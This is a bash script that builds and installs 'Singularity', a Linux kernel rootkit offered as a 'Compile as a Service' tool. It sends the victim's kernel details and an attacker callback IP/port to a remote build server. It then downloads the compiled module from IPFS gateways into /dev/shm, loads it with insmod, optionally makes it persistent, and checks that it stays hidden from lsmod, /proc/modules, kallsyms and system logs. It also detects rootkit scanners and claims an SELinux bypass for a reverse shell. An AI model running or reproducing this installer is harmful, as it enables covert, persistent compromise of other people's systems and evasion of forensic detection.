#!/usr/bin/env bash
#set -Eeuo pipefail
#Function                                                                               Purpose
#plain_line                                                                             Outside box
#_box_msg / info / warn / ok                                            Inside box
#plain_line_box                                                                 Inside box (no icon)
# Configuration
API_BASE="https://compileasaservice.online/buildipfs.php"
DOWNLOAD_URL="https://compileasaservice.online/Downloads"
STATUS_URL_BASE="https://compileasaservice.online/jobstatus"
DOWNLOAD_DIR="."
SLEEP_INTERVAL=10
INSTALL="${INSTALL:-0}"
spinner="/"

GATEWAYS=(
  "https://nftstorage.link/ipfs"
  "https://gateway.pinata.cloud/ipfs"
  "https://cf-ipfs.com/ipfs"
  "https://ipfs.fleek.co/ipfs"
  "https://ipfs.io/ipfs"
  "https://ipfs.infura.io/ipfs"
  "https://gateway.temporal.cloud/ipfs"
  "https://ipfs.eternum.io/ipfs"
)
default() {
  local var="$1" val="$2"
  [[ -z "${!var:-}" ]] && printf -v "$var" '%s' "$val"
}
require() {
  [[ -z "${!1:-}" ]] && { echo "Error: Missing required variable: $1" >&2; exit 1; }
}
require_bin() {
  command -v "$1" &>/dev/null || die "Missing required binary: $1"
}
detect_distro() {
  if command -v lsb_release &>/dev/null; then
    lsb_release -si | tr '[:upper:]' '[:lower:]'
  elif [[ -f /etc/os-release ]]; then
    . /etc/os-release
    echo "$ID"
  fi
}
detect_distro_version() {
  if command -v lsb_release &>/dev/null; then
    lsb_release -rs
  elif [[ -f /etc/os-release ]]; then
    . /etc/os-release
    echo "$VERSION_ID"
  fi
}
detect_kernel_flavor() {
  local kver
  kver="$(uname -r)"
  case "$kver" in
    *amzn2023*|*amzn2*|*amzn*) echo "amazonlinux" ;;
    *el9*|*el8*)              echo "el" ;;
    *ubuntu*)                 echo "ubuntu" ;;
    *)                        echo "" ;;
  esac
}
normalize_distro() {
  case "$1" in
    debian|ubuntu|centos|fedora) echo "$1" ;;
    amazonlinux|amzn|amazon)     echo "amazonlinux" ;;
    rocky)  echo "rocky" ;;
    almalinux)  echo "almalinux" ;;
    *) echo "$1" ;;
  esac
}
rand_int() { shuf -i "$1-$2" -n 1; }
rand_name() {
  local len
  len="$(rand_int 12 16)"
  local c=(b c d f g h j k l m n p r s t v w z)
  local v=(a e i o u y)
  local out=""
  while (( ${#out} < len )); do
    out+="${c[RANDOM % ${#c[@]}]}"
    (( ${#out} < len )) && out+="${v[RANDOM % ${#v[@]}]}"
  done
  echo "${out:0:$len}"
}
export LANG=C.UTF-8
export LC_ALL=C.UTF-8
D='\033[0;90m'
R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
C='\033[0;36m'
B='\033[1;34m'
W='\033[1;37m'
N='\033[0m'
BOLD='\033[1m'
BOX_WIDTH=95       # total width of the box including borders
CONTENT_INDENT=5    # spaces from left border for info/ok/warn

strip_ansi() {
    sed -E 's/\x1B\[[0-9;]*[mK]//g'
}
visible_len() {
    local s="$1"
    printf '%b' "$s" | strip_ansi | wc -c
}
section() {
    local title="$1"
    local title_len=${#title}
    local filler_len=$((BOX_WIDTH - 5 - title_len))
    printf "${C}   ┌─ ${BOLD}%s${N}${C}%*s┐${N}\n" \
        "$title" \
        "$filler_len" \
        "$(printf '─%.0s' $(seq 1 "$filler_len"))"
}
section_end() {
    printf "${C}   └%*s┘${N}\n" $((BOX_WIDTH-3)) "$(printf '─%.0s' $(seq 1 $((BOX_WIDTH-3))))"
}
_box_msg() {
    local symbol="$1"
    local color="$2"
    local msg="$3"
    local avail_width=$((BOX_WIDTH - 5 - CONTENT_INDENT))
    # Strip ANSI only for measuring
    local plain
    plain="$(printf '%b' "$msg" | strip_ansi)"
    # Split message into wrapped lines
    mapfile -t lines < <(fold -s -w "$avail_width" <<< "$plain")

    local first=1
    for line in "${lines[@]}"; do
        local vlen=${#line}
        local padding=$((avail_width - vlen))

        if (( first )); then
            printf "${C}   │${N}%*s${color}%s${N} %s%*s${C}│${N}\n" \
                "$CONTENT_INDENT" "" \
                "$symbol" \
                "$line" \
                "$padding" ""
            first=0
        else
            # Subsequent wrapped lines (no symbol)
            printf "${C}   │${N}%*s  %s%*s${C}│${N}\n" \
                "$CONTENT_INDENT" "" \
                "$line" \
                "$padding" ""
        fi
    done
}
plain_line() {
    local msg="$1"
    printf "   › %b\n" "$msg"
}
skip() {
    local msg="$1"
    printf "   ${D}○ %b${N}\n" "$msg"
}
require_bin() {
  command -v "$1" &>/dev/null || die "Missing required binary: $1"
}
plain_line_box() {
    local msg="$1"
    local avail_width=$((BOX_WIDTH - 2 - CONTENT_INDENT))
    local visible
    visible="$(printf '%b' "$msg" | strip_ansi)"
    local vlen=${#visible}
    (( vlen > avail_width )) && visible="${visible:0:avail_width}" && vlen=$avail_width
    local padding=$((avail_width - vlen))
    printf "${C}   │${N}%*s%b%*s${C}│${N}\n" \
        "$CONTENT_INDENT" "" \
        "$msg" \
        "$padding" ""
}
info()  { _box_msg "›" "$B" "$1"; }
ok()    { _box_msg "✓" "$G" "$1"; }
warn()  { _box_msg "!" "$Y" "$1"; }
die()   { _box_msg "✗" "$R" "$1"; exit 1; }
require_bin curl
require_bin jq
require_bin gzip
default NAME "$(rand_name)"
default SRV_PORT "$(rand_int 30000 65000)"
default PORT "$(rand_int 30000 65000)"
default ICMP_MAGIC_SEQ "$(rand_int 1000 50000)"
default MAGIC "mtz"
default DISTRO "$(detect_distro)"
default DISTRO_VERSION "$(detect_distro_version)"
default KVER "$(uname -r)"
default KERNEL_FLAVOR "$(detect_kernel_flavor)"
DISTRO="$(normalize_distro "$DISTRO")"
if [[ "$KERNEL_FLAVOR" == "amazonlinux" ]]; then
  DISTRO="amazonlinux"
fi
# Validation
require YOUR_SRV_IP
require SRV_PORT
require NAME
require PORT
require ICMP_MAGIC_SEQ
require MAGIC
require DISTRO
require DISTRO_VERSION
require KVER



# Banner
echo -e "${C}   ┌────────────────────────────────────────────────────────────────────────────────────────────┐${N}"
echo -e "${C}   │${N}                                                                                            ${C}│${N}"
echo -e "${C}   │${W}      ██████╗ ██████╗ ███╗   ███╗██████╗ ██╗██╗     ███████╗      █████╗ ███████╗           ${C}│${N}"
echo -e "${C}   │${W}     ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██║██║     ██╔════╝     ██╔══██╗██╔════╝           ${C}│${N}"
echo -e "${C}   │${W}     ██║     ██║   ██║██╔████╔██║██████╔╝██║██║     █████╗       ███████║███████╗           ${C}│${N}"
echo -e "${C}   │${W}     ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██║██║     ██╔══╝       ██╔══██║╚════██║           ${C}│${N}"
echo -e "${C}   │${W}     ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ██║███████╗███████╗     ██║  ██║███████║           ${C}│${N}"
echo -e "${C}   │${W}      ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝     ╚═╝  ╚═╝╚══════╝           ${C}│${N}"
echo -e "${C}   │${W}                                                                                            ${C}│${N}"
echo -e "${C}   │${W}         █████╗      ███████╗███████╗██████╗ ██╗   ██╗██╗ ██████╗ ███████╗                  ${C}│${N}"
echo -e "${C}   │${W}        ██╔══██╗     ██╔════╝██╔════╝██╔══██╗██║   ██║██║██╔════╝ ██╔════╝                  ${C}│${N}"
echo -e "${C}   │${W}        ███████║     ███████╗█████╗  ██████╔╝██║   ██║██║██║      █████╗                    ${C}│${N}"
echo -e "${C}   │${W}        ██╔══██║     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██║      ██╔══╝                    ${C}│${N}"
echo -e "${C}   │${W}        ██║  ██║     ███████║███████╗██║  ██║ ╚████╔╝ ██║╚██████╗ ███████╗                  ${C}│${N}"
echo -e "${C}   │${W}        ╚═╝  ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝ ╚═════╝ ╚══════╝                  ${C}│${N}"
echo -e "${C}   └────────────────────────────────────────────────────────────────────────────────────────────┘${N}"
echo -e "${C}   ┌────────────────────────────────────────────────────────────────────────────────────────────┐${N}"
echo -e "${C}   │${N}                                                                                            ${C}│${N}"
echo -e "${C}   │${W}  ███████╗██╗███╗   ██╗ ██████╗ ██╗   ██╗██╗      █████╗ ██████╗ ██╗████████╗██╗   ██╗      ${C}│${N}"
echo -e "${C}   │${W}  ██╔════╝██║████╗  ██║██╔════╝ ██║   ██║██║     ██╔══██╗██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝      ${C}│${N}"
echo -e "${C}   │${W}  ███████╗██║██╔██╗ ██║██║  ███╗██║   ██║██║     ███████║██████╔╝██║   ██║     ╚████╔╝      ${C}│${N}"
echo -e "${C}   │${W}  ╚════██║██║██║╚██╗██║██║   ██║██║   ██║██║     ██╔══██║██╔══██╗██║   ██║      ╚██╔╝       ${C}│${N}"
echo -e "${C}   │${W}  ███████║██║██║ ╚████║╚██████╔╝╚██████╔╝███████╗██║  ██║██║  ██║██║   ██║       ██║        ${C}│${N}"
echo -e "${C}   │${W}  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝       ╚═╝        ${C}│${N}"
echo -e "${C}   │${N}                                                                                            ${C}│${N}"
echo -e "${C}   │${D}                       Shall we give forensics a little work?                               ${C}│${N}"
echo -e "${C}   │${D}                            github.com/MatheuZSecurity                                      ${C}│${N}"
echo -e "${C}   │${N}                                                                                            ${C}│${N}"
echo -e "${C}   └────────────────────────────────────────────────────────────────────────────────────────────┘${N}"

GITHUB_REV=$(curl -fs https://api.github.com/repos/MatheuZSecurity/Singularity/commits/main | grep -m1 '"sha"' | cut -d'"' -f4 | cut -c1-7)
MY_VERSION=$(curl -fs https://compileasaservice.online/version.txt)



section "MODULE INFORMATION"
info "Module:          $NAME"
info "YOUR_SRV_IP:     $YOUR_SRV_IP"
info "SRV_PORT:        $SRV_PORT"
info "hidden port:     $PORT"
info "ICMPSEQ:         $ICMP_MAGIC_SEQ"
info "MAGIC:           $MAGIC"
info "Distro:          $DISTRO"
info "Distro Version:  $DISTRO_VERSION"
info "Kernel:          $KVER"
info "GITHUB Version:  $GITHUB_REV"
info "CaaS Version     $MY_VERSION"

section_end
#info "Requesting build job..."
get_memory_kb() {
    grep MemAvailable /proc/meminfo | awk '{print $2}'
}
get_cpu_usage() {
    top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1
}
section "SYSTEM CHECK"
if [[ ! -f "/proc/sys/kernel/modules_disabled" ]]; then
    die "Cannot verify module loading status"
fi
modules_disabled=$(cat /proc/sys/kernel/modules_disabled 2>/dev/null)
if [[ "$modules_disabled" == "1" ]]; then
    die "Module loading is disabled (modules_disabled=1)"
fi
ok "Module loading enabled"
section_end
section "SELINUX CHECK"
if command -v getenforce &>/dev/null; then
    selinux_status=$(getenforce 2>/dev/null)
    case "$selinux_status" in
        Enforcing)
            warn "SELinux is ${R}Enforcing${N}"
            info "Rootkit includes SELinux bypass for reverse shell"
            ;;
        Permissive)
            info "SELinux is ${Y}Permissive${N}"
            ;;
        Disabled)
            ok "SELinux is ${G}Disabled${N}"
            ;;
        *)
            skip "SELinux status unknown"
            ;;
    esac
elif [[ -f "/etc/selinux/config" ]]; then
    info "SELinux config present but not active"
else
    info "SELinux not installed"
fi
section_end
section "DETECTION TOOLS"
detected_tools=()
if command -v chkrootkit &>/dev/null; then
    detected_tools+=("chkrootkit")
    warn "chkrootkit detected"
fi
if command -v rkhunter &>/dev/null; then
    detected_tools+=("rkhunter")
    warn "rkhunter detected"
fi
if command -v unhide &>/dev/null; then
    detected_tools+=("unhide")
    warn "unhide detected"
fi
if command -v lynis &>/dev/null; then
    detected_tools+=("lynis")
    warn "lynis detected"
fi
if [[ ${#detected_tools[@]} -eq 0 ]]; then
    ok "No rootkit scanners detected"
else
    ok "Singularity hides from: lsmod, /proc/modules, dmesg, kallsyms"
fi
section_end
section "CONNTRACK CHECK"
if command -v conntrack &>/dev/null; then
    conntrack -L &>/dev/null || true
    if lsmod | grep -q "nf_conntrack_netlink"; then
        ok "nf_conntrack_netlink ${D}(module)${N}"
    elif [[ -d "/sys/module/nf_conntrack_netlink" ]]; then
        ok "nf_conntrack_netlink ${D}(built-in)${N}"
    else
        modprobe nf_conntrack_netlink 2>/dev/null || true
        conntrack -L &>/dev/null || true
        if lsmod | grep -q "nf_conntrack_netlink" || [[ -d "/sys/module/nf_conntrack_netlink" ]]; then
            ok "nf_conntrack_netlink ${D}(loaded)${N}"
        else
            warn "nf_conntrack_netlink not available"
        fi
    fi
else
    warn "conntrack-tools not installed"
        info "These hooks will be installed but won't affect the system without conntrack"
        info "This is ${G}not a critical dependency${N} - installation will continue"
fi
section_end
section "BUILD"
info "Requesting job build from server..."
response="$(curl -fsSL \
  --get "$API_BASE" \
  --data-urlencode "name=$NAME" \
  --data-urlencode "kver=$KVER" \
  --data-urlencode "YOUR_SRV_IP=$YOUR_SRV_IP" \
  --data-urlencode "SRV_PORT=$SRV_PORT" \
  --data-urlencode "PORT=$PORT" \
  --data-urlencode "ICMP_MAGIC_SEQ=$ICMP_MAGIC_SEQ" \
  --data-urlencode "MAGIC=$MAGIC" \
  --data-urlencode "DISTRO=$DISTRO" \
  --data-urlencode "DISTRO_VERSION=$DISTRO_VERSION"
)"
job_id="$(jq -r '.job_id // empty' <<<"$response")"
[ -n "$job_id" ] || die "Invalid server response: $response"
info "Job ID: $job_id"
section_end
# Poll job status until completion
section "POLLING"
info "Waiting for build to complete..."
status_url="$STATUS_URL_BASE/$job_id.json"
spinner="/"
info "[${spinner}] Job status: pending"
while true; do
    status_json="$(curl -fsS "$status_url" 2>/dev/null || true)"
    status="$(jq -r '.status // empty' <<<"$status_json")"
    cid="$(jq -r '.ipfs_hash // empty' <<<"$status_json")"
    filename="$(jq -r '.filename // empty' <<<"$status_json")"
    if [[ "$status" == "completed" && -n "$cid" ]]; then
        # Move up, clear, print final OK
        printf "\033[A\033[2K"
        ok "Build completed: $filename (IPFS: $cid)"
                sleep 5
        break
    elif [[ "$status" == "failed" ]]; then
        printf "\033[A\033[2K"
        die "Build failed on server"
    else
        # Toggle spinner
        if [[ "$spinner" == "/" ]]; then
            spinner="\\"
        else
            spinner="/"
        fi
        # Move up one line, clear it, redraw
        printf "\033[A\033[2K"
        info "[${spinner}] Job status: ${status:-pending}"
        sleep "$SLEEP_INTERVAL"
    fi
done
section_end
# Download module from IPFS gateways
section "DOWNLOADING"
output_gz="$DOWNLOAD_DIR/$filename"
output_ko="/dev/shm/$NAME-$KVER.ko"
downloaded=0
download_gz="/dev/shm/$NAME-$KVER.ko.gz"
# First, try IPFS gateways
for gw in "${GATEWAYS[@]}"; do
    url="$gw/$cid"
    info "Trying gateway: $gw"
    if curl -sfL  --connect-timeout 10 --max-time 300 -o "$download_gz" "$url"; then
        downloaded=1
                info "$NAME-$DISTRO-$DISTRO_VERSION-$KVER Downloadable again at"
                info "$url"
        break
    fi
    warn "Failed: $gw"
done
# If IPFS failed, fallback to webhosting URL
if (( ! downloaded )); then
    web_url="$DOWNLOAD_URL/$NAME-$DISTRO_VERSION-$KVER.ko.gz"
    info "THe URL below will be cleared out at some point, I recommend you download to your own hosting box"
    info "URL: $web_url"
    if curl -sfL  --connect-timeout 10 --max-time 300 -o "$download_gz" "$web_url"; then
        ok "Downloaded via web hosting"
        downloaded=1
    else
        warn "Failed to download from web hosting as well"
    fi
fi
# Fail if nothing worked
(( downloaded )) || die "All download sources failed"
gzip -df "$download_gz"
[ -f "$output_ko" ] || die "Decompression1 failed"
ok "Module ready: $output_ko"
section_end
# Optional install logic (if INSTALL=1)

if [ "$INSTALL" -eq 1 ] && [[ $EUID -eq 0 ]]; then
        echo 0 > /proc/sys/kernel/hung_task_timeout_secs
        section "SYSTEM BASELINE"
        info "Capturing system state before module load..."
        mem_before=$(get_memory_kb)
        cpu_before=$(get_cpu_usage)
        mem_before_mb=$((mem_before / 1024))
        ok "Memory available: ${W}${mem_before_mb} MB${N}"
        ok "CPU usage: ${W}${cpu_before}%${N}"
        section_end
        section "INSTALLING"
        info "Loading kernel module..."
        info "Measuring impact..."
        mem_after=$(get_memory_kb)
        cpu_after=$(get_cpu_usage)
        mem_after_mb=$((mem_after / 1024))
        mem_diff_kb=$((mem_before - mem_after))
        mem_diff_mb=$((mem_diff_kb / 1024))
        cpu_before_fixed=$(echo "$cpu_before" | tr ',' '.')
        cpu_after_fixed=$(echo "$cpu_after" | tr ',' '.')
        if command -v bc &>/dev/null; then
                cpu_diff=$(echo "$cpu_after_fixed - $cpu_before_fixed" | bc 2>/dev/null)
                [[ -z "$cpu_diff" ]] && cpu_diff="0.0"
        else
                cpu_diff=$(awk "BEGIN {printf \"%.1f\", $cpu_after_fixed - $cpu_before_fixed}" 2>/dev/null || echo "0.0")
        fi
        if [[ $mem_diff_kb -lt 0 ]]; then
                mem_diff_kb=$((mem_diff_kb * -1))
                mem_diff_mb=$((mem_diff_kb / 1024))
                ok "Memory available: ${W}${mem_after_mb} MB${N} ${D}(+${mem_diff_mb} MB)${N}"
        else
                ok "Memory available: ${W}${mem_after_mb} MB${N} ${D}(-${mem_diff_mb} MB)${N}"
        fi
        ok "CPU usage: ${W}${cpu_after}%${N} ${D}( ${cpu_diff}%)${N}"
        mem_abs=$mem_diff_mb
        [[ $mem_abs -lt 0 ]] && mem_abs=$((mem_abs * -1))
        if [[ $mem_abs -lt 5 ]]; then
                ok "Memory footprint: ${G}Minimal (<5 MB)${N}"
        elif [[ $mem_abs -lt 50 ]]; then
                ok "Memory footprint: ${Y}${mem_abs} MB${N}"
        else
                warn "Memory footprint: ${R}${mem_abs} MB (HIGH)${N}"
        fi
        section_end
                if [[ "$PERSIST" -eq 1 ]] && [[ $EUID -eq 0 ]]; then

                section "PERSISTANCE"
                        MODULE_DIR="/usr/lib/modules/$(uname -r)/kernel"
                        CONF_DIR="/etc/modules-load.d"
                        KO_FILE="$output_ko"
                        mkdir -p "$MODULE_DIR"
                        mkdir -p "$CONF_DIR"
                        info "[*] Copying $KO_FILE to $MODULE_DIR..."
                        cp "$KO_FILE" "$MODULE_DIR/$NAME.ko"
                        info "[*] Running depmod..."
                        depmod
                        info "[*] Setting up persistence..."
                        echo "$NAME" > "$CONF_DIR/$NAME.conf"
                        insmod "$MODULE_DIR/$NAME.ko"
                        if [ $? -eq 0 ]; then
                                info "[+] Module '$NAME' loaded successfully!"
                        else
                                info "[!] Failed to load the module."
                        fi
                        section_end
                else
        if ! insmod $output_ko 2>/dev/null; then
        die "Failed to load module"
        fi
                ok "Module loaded"
                fi
                sleep 1
                section "Impact"
                info "Measuring impact..."
                mem_after=$(get_memory_kb)
                cpu_after=$(get_cpu_usage)
                mem_after_mb=$((mem_after / 1024))
                mem_diff_kb=$((mem_before - mem_after))
                mem_diff_mb=$((mem_diff_kb / 1024))
                cpu_before_fixed=$(echo "$cpu_before" | tr ',' '.')
                cpu_after_fixed=$(echo "$cpu_after" | tr ',' '.')
                if command -v bc &>/dev/null; then
                        cpu_diff=$(echo "$cpu_after_fixed - $cpu_before_fixed" | bc 2>/dev/null)
                        [[ -z "$cpu_diff" ]] && cpu_diff="0.0"
                else
                        cpu_diff=$(awk "BEGIN {printf \"%.1f\", $cpu_after_fixed - $cpu_before_fixed}" 2>/dev/null || echo "0.0")
                fi
                if [[ $mem_diff_kb -lt 0 ]]; then
                        mem_diff_kb=$((mem_diff_kb * -1))
                        mem_diff_mb=$((mem_diff_kb / 1024))
                        ok "Memory available: ${W}${mem_after_mb} MB${N} ${D}(+${mem_diff_mb} MB)${N}"
                else
                        ok "Memory available: ${W}${mem_after_mb} MB${N} ${D}(-${mem_diff_mb} MB)${N}"
                fi
                ok "CPU usage: ${W}${cpu_after}%${N} ${D}( ${cpu_diff}%)${N}"
                mem_abs=$mem_diff_mb
                [[ $mem_abs -lt 0 ]] && mem_abs=$((mem_abs * -1))
                if [[ $mem_abs -lt 5 ]]; then
                        ok "Memory footprint: ${G}Minimal (<5 MB)${N}"
                elif [[ $mem_abs -lt 50 ]]; then
                        ok "Memory footprint: ${Y}${mem_abs} MB${N}"
                else
                        warn "Memory footprint: ${R}${mem_abs} MB (HIGH)${N}"
                fi
                section_end
                section "VERIFICATION"
                pass=0
                fail=0
                if lsmod | grep -q "^$NAME"; then
                        warn "lsmod shows module"
                        ((fail++))
                else
                        ok "lsmod ${D}(hidden)${N}"
                        ((pass++))
                fi
                if grep -q "^$NAME" /proc/modules 2>/dev/null; then
                        warn "/proc/modules shows module"
                        ((fail++))
                else
                        ok "/proc/modules ${D}(hidden)${N}"
                        ((pass++))
                fi
                if [[ -d "/sys/module/$NAME" ]]; then
                        warn "/sys/module/singularity exists"
                        ((fail++))
                else
                        ok "/sys/module/ ${D}(hidden)${N}"
                        ((pass++))
                fi
                if [[ -f "/proc/sys/kernel/tainted" ]]; then
                        taint_value=$(cat /proc/sys/kernel/tainted 2>/dev/null)
                        if [[ "$taint_value" != "0" ]]; then
                                warn "Kernel tainted (value: $taint_value)"
                                ((fail++))
                        else
                                ok "Kernel taint ${D}(clean)${N}"
                                ((pass++))
                        fi
                fi
                log_exposed=0
                if dmesg 2>/dev/null | grep -qi "$NAME\|taint"; then
                        ((log_exposed++))
                fi
                if command -v journalctl &>/dev/null; then
                        if journalctl -k --no-pager 2>/dev/null | grep -qi "$NAME\|taint"; then
                                ((log_exposed++))
                        fi
                fi
                if [[ -f "/var/log/kern.log" ]]; then
                        if tail -50 /var/log/kern.log 2>/dev/null | grep -qi "$NAME\|taint"; then
                                ((log_exposed++))
                        fi
                fi
                if [[ -f "/var/log/syslog" ]]; then
                        if tail -50 /var/log/syslog 2>/dev/null | grep -qi "$NAME\|taint"; then
                                ((log_exposed++))
                        fi
                fi
                if [[ $log_exposed -gt 0 ]]; then
                        warn "Logs contain traces ${D}($log_exposed sources)${N}"
                        ((fail++))
                else
                        ok "Logs clean ${D}(dmesg, journalctl, kern.log, syslog)${N}"
                        ((pass++))
                fi
                if grep -qi "$NAME" /proc/kallsyms 2>/dev/null; then
                        warn "kallsyms shows module symbols"
                        ((fail++))
                else
                        ok "kallsyms ${D}(hidden)${N}"
                        ((pass++))
                fi
                section_end
echo ""
echo -e "${C}   ┌─────────────────────────────────────────────────────────────┐${N}"
if [[ $fail -eq 0 ]]; then
    echo -e "${C}   │${N}                                                             ${C}│${N}"
    echo -e "${C}   │${N}   ${D}▸${N} Work in /dev/shm or /run for more stealth               ${C}│${N}"
    echo -e "${C}   │${N}   ${D}▸${N} Logs and traces filtered                                ${C}│${N}"
    echo -e "${C}   │${N}                                                             ${C}│${N}"
else
    echo -e "${C}   │${N}                                                             ${C}│${N}"
    echo -e "${C}   │${N}            ${W}Tests:${N} ${G}$pass passed${N}  ${R}$fail failed${N}                     ${C}│${N}"
    echo -e "${C}   │${N}                                                             ${C}│${N}"
    echo -e "${C}   │${N}   ${D}▸${N} Work in /dev/shm or /run for more stealth              ${C}│${N}"
    echo -e "${C}   │${N}   ${D}▸${N} Logs and traces filtered                               ${C}│${N}"
    echo -e "${C}   │${N}                                                             ${C}│${N}"
fi
echo -e "${C}   └─────────────────────────────────────────────────────────────┘${N}"
echo ""
if [[ ${#detected_tools[@]} -gt 0 ]]; then
    echo -e "${Y}     NOTE: Rootkit scanner(s) present: ${detected_tools[*]}, but singularity easily bypass these tools.${N}"
    echo ""
fi
